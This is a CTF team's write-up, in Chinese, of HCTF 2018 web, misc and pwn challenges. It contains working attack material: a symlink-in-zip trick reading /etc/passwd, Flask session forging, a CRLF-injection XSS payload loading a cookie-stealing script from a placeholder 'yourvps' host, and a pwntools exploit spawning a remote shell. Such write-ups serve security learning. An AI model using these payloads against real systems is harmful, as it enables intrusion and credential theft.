<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>找到源码   <a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/</a></p>
<p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/admin_00.png" alt></p>
<p>有个进程每30秒重置一次数据库</p>
<p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/admin_01.png" alt></p>
<p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/admin_02.png" alt><br>看到strlower函数很奇怪<br>参考：<a href="http://blog.lnyas.xyz/?p=1411" target="_blank" rel="noopener">http://blog.lnyas.xyz/?p=1411</a><br>最后解题步骤如下<br>注册一个ᴬdmin账号<br>登陆ᴬdmin，发现页面显示Admin<br>修改密码，退出登录<br>重新登陆Admin，看到flag<br><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/admin_03.png" alt></p>
<h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><p>传个zip，会解压缩并且读取<br>尝试传个链接文件ln -s /etc/passwd test 并压缩上传<br>读到/etc/passwd</p>
<p>然后就是各种文件读取<br>在 /proc/self/environ读取到一个好东西</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=323a960bcc1aSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0</span><br></pre></td></tr></table></figure>
<p>然后直接读/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini文件得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app</span><br></pre></td></tr></table></figure>
<p>按部就班读取项目文件 /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py<br>得到<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">'1'</span>):</span><br><span class="line">        session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    username=request.form[<span class="string">'username'</span>]</span><br><span class="line">    password=request.form[<span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">'username'</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    file = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'This file already exists'</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">'_'</span></span><br><span class="line">        os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">'rm -rf '</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="keyword">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, debug=<span class="keyword">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure></p>
<p>因为有这段<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br></pre></td></tr></table></figure></p>
<p>如果文件里有hctf就返回主页<br>所以不能直接读flag.py，也没有flag.pyc<br>后面读index.html发现admin用户登录就能看到flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  &#123;% <span class="keyword">if</span> user == <span class="string">'admin'</span> %&#125;</span><br><span class="line">        Your flag: &lt;br&gt;</span><br><span class="line">        &#123;&#123; flag  &#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>想到要读secret，伪造admin的session，发现代码里的secret是伪随机的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br></pre></td></tr></table></figure></p>
<p>随机数种子固定为mac地址，读取 /sys/class/net/eth0/address 可以得到<br>然后带入seed，本地跑一下，登陆admin拿到cookie，再放到网站上就能看到flag了<br><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/hide_and_seek_00.png" alt></p>
<h2 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h2><p>赛后解出：<br><a href="http://game.2018.hctf.io/web2/user.php?order=password" target="_blank" rel="noopener">http://game.2018.hctf.io/web2/user.php?order=password</a><br>这样可以按照密码进行排序<br>不断注册新用户，密码逐位逐位与admin的密码比较，最后得到admin的密码，比如注册个密码为d的用户</p>
<p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/Game_00.png" alt></p>
<p>然后按密码排序，发现它在admin下面</p>
<p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/Game_01.png" alt></p>
<p>然后注册一个密码为e的用户，发现他在admin上面</p>
<p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/Game_02.png" alt></p>
<p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/Game_03.png" alt></p>
<p>由此可以推算出admin密码第一位是d，按照此原理，逐位得到完整的admin密码为<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/Game_04.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## bottle</span><br><span class="line">直接参考p总链接即可:</span><br><span class="line">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</span><br><span class="line"></span><br><span class="line">首先发现CLRF</span><br><span class="line"></span><br><span class="line">![](https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/bottle_00.png)</span><br><span class="line"></span><br><span class="line">刚开始的时候，CSP是在响应包的上面的，需要想办法绕过CSP。</span><br><span class="line">第二天CSP被设置到响应包下面了。</span><br><span class="line">接下来就简单了，只需要绕过302跳转就可以打到cookie。因为302的时候不会xss。利用`&lt;80`端口可以绕过302跳转。可以在浏览器手动试一下。</span><br><span class="line"></span><br><span class="line">80端口的时候可以发现跳转到了题目的首页</span><br><span class="line"></span><br><span class="line">小于80端口的时候可以发现返回了我们构造的响应包下面的内容，这个时候手动访问可以看到打到了cookie。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">所以拿着下面这个payload就可以打到cookie了。</span><br><span class="line">http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/%0d%0aContent-Length:%2065%0d%0a%0d%0a%3Cscript%20src=http://yourvps/cookie.js%3E%3C/script%3E</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">改cookie登陆</span><br><span class="line"></span><br><span class="line">![](https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/bottle_01.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Misc</span><br><span class="line">## easy dump</span><br><span class="line">用volatility看了一下，发现有mspaint进程，把内存dump下来</span><br><span class="line">把mspaint.exe dump下来的内存改名为.data后缀，用gimp打开，调整位移 宽度 高度</span><br><span class="line"></span><br><span class="line">![](https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Misc/easy_dump_00.png)</span><br><span class="line"></span><br><span class="line">&gt; `flag:hctf&#123;big_brother_is_watching_you&#125;`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## freq game</span><br></pre></td></tr></table></figure></p>
<p>FFT different frequency sin<br>MATLAB: y = importdata(“”); 加载样本点<br>Y = fft(y);<br>plot(abs(Y));<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">![](https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Misc/freq_game_00.png)</span><br><span class="line"></span><br><span class="line">根据图片查看频率值，对称的四个正弦函数的频率，最高点对应的横坐标减1就是频率</span><br><span class="line">交互8次，即可得到flag</span><br><span class="line"></span><br><span class="line">## difficult programming language</span><br><span class="line">解压后发现一个pcap包，Wireshark打开发现是USB流量包，简单浏览后发现每帧都有8字节，且仅第一字节和第三字节有数据，猜测是键盘的流量，于是本地自己抓键盘的包试了下：</span><br><span class="line">第一个字节</span><br><span class="line">0x01 ctrl</span><br><span class="line">0x02 shift</span><br><span class="line">第三个字节是按键的键值就不列出了，后面找了下相关资料验证了这个猜想，于是tshark先把每帧的Leftover Capture Data提取出来，然后写个脚本把键值转成字符串，得到一个混杂字母和符号的字符串，根据题目所给“difficult programming language”猜测可能是malbolge语言，找个解释器把解出的字符串丢进去跑一下就得到flag。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">代码：</span><br><span class="line"></span><br><span class="line">``` python</span><br><span class="line">usb_data = open(&apos;usbdata.txt&apos;)</span><br><span class="line"></span><br><span class="line">str_decode = &apos;&apos;</span><br><span class="line"></span><br><span class="line">for i in range(422):</span><br><span class="line">    buffer = usb_data.readline()</span><br><span class="line">    cmd = int(buffer[6] + buffer[7], 16)</span><br><span class="line">    if cmd != 0:</span><br><span class="line">        if buffer[1] == &apos;0&apos;:</span><br><span class="line">            if 4 &lt;= cmd &lt;= 29:</span><br><span class="line">                str_decode += chr(ord(&apos;a&apos;) + cmd - 4)</span><br><span class="line">            elif 30 &lt;= cmd &lt;= 38:</span><br><span class="line">                str_decode += chr(ord(&apos;1&apos;) + cmd - 30)</span><br><span class="line">            elif cmd == 39:</span><br><span class="line">                str_decode += &apos;0&apos;</span><br><span class="line"></span><br><span class="line">            elif cmd == 45:</span><br><span class="line">                str_decode += &apos;-&apos;</span><br><span class="line">            elif cmd == 46:</span><br><span class="line">                str_decode += &apos;=&apos;</span><br><span class="line">            elif cmd == 47:</span><br><span class="line">                str_decode += &apos;[&apos;</span><br><span class="line">            elif cmd == 48:</span><br><span class="line">                str_decode += &apos;]&apos;</span><br><span class="line">            elif cmd == 49:</span><br><span class="line">                str_decode += &apos;\\&apos;</span><br><span class="line">            elif cmd == 51:</span><br><span class="line">                str_decode += &apos;;&apos;</span><br><span class="line">            elif cmd == 52:</span><br><span class="line">                str_decode += &quot;&apos;&quot;</span><br><span class="line">            elif cmd == 53:</span><br><span class="line">                str_decode += &apos;`&apos;</span><br><span class="line">            elif cmd == 54:</span><br><span class="line">                str_decode += &apos;,&apos;</span><br><span class="line">            elif cmd == 55:</span><br><span class="line">                str_decode += &apos;.&apos;</span><br><span class="line">            elif cmd == 56:</span><br><span class="line">                str_decode += &apos;/&apos;</span><br><span class="line"></span><br><span class="line">            else:</span><br><span class="line">                print(&apos;!!!&apos;)</span><br><span class="line">        elif buffer[1] == &apos;2&apos;:</span><br><span class="line">            if 4 &lt;= cmd &lt;= 29:</span><br><span class="line">                str_decode += chr(ord(&apos;A&apos;) + cmd - 4)</span><br><span class="line">            # elif 30 &lt;= cmd &lt;= 38:</span><br><span class="line">            #     str_decode += &apos;!!!&apos;</span><br><span class="line"></span><br><span class="line">            elif cmd == 30:</span><br><span class="line">                str_decode += &apos;!&apos;</span><br><span class="line">            elif cmd == 31:</span><br><span class="line">                str_decode += &apos;@&apos;</span><br><span class="line">            elif cmd == 32:</span><br><span class="line">                str_decode += &apos;#&apos;</span><br><span class="line">            elif cmd == 33:</span><br><span class="line">                str_decode += &apos;$&apos;</span><br><span class="line">            elif cmd == 34:</span><br><span class="line">                str_decode += &apos;%&apos;</span><br><span class="line">            elif cmd == 35:</span><br><span class="line">                str_decode += &apos;^&apos;</span><br><span class="line">            elif cmd == 36:</span><br><span class="line">                str_decode += &apos;&amp;&apos;</span><br><span class="line">            elif cmd == 37:</span><br><span class="line">                str_decode += &apos;*&apos;</span><br><span class="line">            elif cmd == 38:</span><br><span class="line">                str_decode += &apos;(&apos;</span><br><span class="line">            elif cmd == 39:</span><br><span class="line">                str_decode += &apos;)&apos;</span><br><span class="line">            elif cmd == 45:</span><br><span class="line">                str_decode += &apos;_&apos;</span><br><span class="line">            elif cmd == 46:</span><br><span class="line">                str_decode += &apos;+&apos;</span><br><span class="line">            elif cmd == 47:</span><br><span class="line">                str_decode += &apos;&#123;&apos;</span><br><span class="line">            elif cmd == 48:</span><br><span class="line">                str_decode += &apos;&#125;&apos;</span><br><span class="line">            elif cmd == 49:</span><br><span class="line">                str_decode += &apos;|&apos;</span><br><span class="line">            elif cmd == 51:</span><br><span class="line">                str_decode += &apos;:&apos;</span><br><span class="line">            elif cmd == 52:</span><br><span class="line">                str_decode += &apos;&quot;&apos;</span><br><span class="line">            elif cmd == 53:</span><br><span class="line">                str_decode += &apos;~&apos;</span><br><span class="line">            elif cmd == 54:</span><br><span class="line">                str_decode += &apos;&lt;&apos;</span><br><span class="line">            elif cmd == 55:</span><br><span class="line">                str_decode += &apos;&gt;&apos;</span><br><span class="line">            elif cmd == 56:</span><br><span class="line">                str_decode += &apos;?&apos;</span><br><span class="line"></span><br><span class="line">            else:</span><br><span class="line">                print(&apos;!!!&apos;)</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;!!!&apos;)</span><br><span class="line">            print(buffer)</span><br><span class="line">print(str_decode)</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p><code>flag:hctf{m4lb0lGe}</code></p>
</blockquote>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="the-end"><a href="#the-end" class="headerlink" title="the_end"></a>the_end</h2><p>有点像0ctf2017-left:</p>
<p>exit会调用dl_fini，里面有一个call，可以去修改ld.so 附近的一个地方，直接填one_gadget get shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">e=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./the_end'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'150.109.44.250'</span>, <span class="number">20002</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> debug:</span><br><span class="line">    ru(<span class="string">'Input your token:'</span>)</span><br><span class="line">    se(<span class="string">'uvm73jg2AFMECo71DIZRZh39MRqFOI2w\n'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'here is a gift '</span>)</span><br><span class="line">base=int(ru(<span class="string">','</span>)[:<span class="number">-1</span>],<span class="number">16</span>)-e.symbols[<span class="string">'sleep'</span>]</span><br><span class="line">call=base+<span class="number">0x5F0F48</span></span><br><span class="line">one_gadget=p64(base+<span class="number">0xf02a4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    se(p64(call+i))</span><br><span class="line">    se(one_gadget[i])</span><br><span class="line"></span><br><span class="line">print(hex(base))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'cat flag&gt;&amp;0'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>flag:hctf{706a09271a59b9e2db1a2d0cf1e40e2073c0a886197f6f3cf3b5d2114fc600d7}</code></p>
</blockquote>
<h2 id="easyexp"><a href="#easyexp" class="headerlink" title="easyexp"></a>easyexp</h2><p>clone 了一个子线程，mount 了tmpfs到/tmp那里，再chdir到mount的这个tmp那里，然后sleep 1000000秒之后 结束<br>设子线程pid=cpid<br>主线程chdir到 /proc/cpid/cwd/  ，然后在里面创建文件夹和假flag<br>ls没有限制 / 和 ..   所以可以看所有目录的情况</p>
